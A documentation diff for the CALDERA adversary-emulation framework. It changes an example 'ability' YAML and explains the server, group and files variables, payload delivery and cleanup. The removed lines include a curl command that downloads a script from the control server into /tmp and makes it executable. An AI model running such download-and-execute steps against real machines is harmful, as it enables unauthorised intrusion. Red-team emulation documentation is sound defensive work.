@@ -17,51 +17,57 @@ This file should include an ID, name, description, ATT&CK tactic and command.
 
 Below is an example ability. Read this carefully, it will be referenced later on.
 ```
-- id: e9bcdf0d-be08-4aec-bf1e-e73655403d55
-  name: Download WIFI tools
-  description: Download a set of commands for manipulating WIFI
+- id: a0676fe1-cd52-482e-8dde-349b73f9aa69
+  name: Preferred WIFI
+  description: See the most used WIFI networks of a machine
   tactic: discovery
   technique:
     attack_id: T1016
     name: System Network Configuration Discovery
-  platforms:
+  executors:
     darwin:
       command: |
-        curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
-        chmod +x /tmp/wifi.sh
-      cleanup:
-        rm /tmp/wifi.sh
+        #{files}/wifi.sh pref
+      payload: wifi.sh
+    linux:
+      command: |
+        #{files}/wifi.sh pref
+      payload: wifi.sh
+    windows:
+      command: |
+        #{files}\wifi.ps1 -Pref
+      payload: wifi.ps1
 ```
 
 ### Ability variables
 
-As you write abilities, note that there are two global variables available, server and group, which 
-can be used inside an ability command.
+As you write abilities, note that there are 3 global variables available, which can be used
+inside an ability command:
 
-A variable is referenced with the syntax #{variable}.
+> A variable is referenced with the syntax #{variable}.
 
-* Server / #{server}: The location of CALDERA. Because each agent may have a different reference point
+* server: The location of CALDERA. Because each agent may have a different reference point
 for where CALDERA is (IP, FQDN, etc), if an ability wants to reference CALDERA it should use #{server}. 
-* Group / #{group}: The group used in the active operation.
+* group: The group used in the active operation.
+* files: The location where payload files will be dropped; typically this is the TMP directory. 
 
-In the ability example above, note the usage of the #{server} variable.
+In the ability example above, note the usage of the #{server}  and #{files} variables.
 
 The group variable is a bit more advanced. This is useful primarily for lateral movement abilities where
 the agent may move itself to a new host. 
 
 ### Download files from CALDERA to an agent
 
-In the ability example, note the command downloading the wifi.sh file from CALDERA. It does this by sending a
-POST request to the API endpoint /file/download, including the requested filename as a header.
-
-The /file/download endpoint will look inside the payloads directory.
+In the ability example, note the payload field. When this ability runs, it will
+download this file from the CALDERA /file/download directory, putting it in the client's
+files directory. The payload file itself must be located in the payloads directory as 
+specified in the local.yml.
 
 ### Cleanup
 
 Abilities can optionally include a cleanup block, which will execute automatically at the end of an operation. The
-cleanup should be used in instances you want to reverse a mutable action, such as stopping a started process. In
-the ability example above, note how the cleanup block is written. Cleanup actions will occur in reverse order
-of the abilities that ran.
+cleanup should be used in instances you want to reverse a mutable action, such as stopping a started process. 
+Cleanup actions will occur in reverse order of the abilities that ran.
 
 ## Adversaries
 
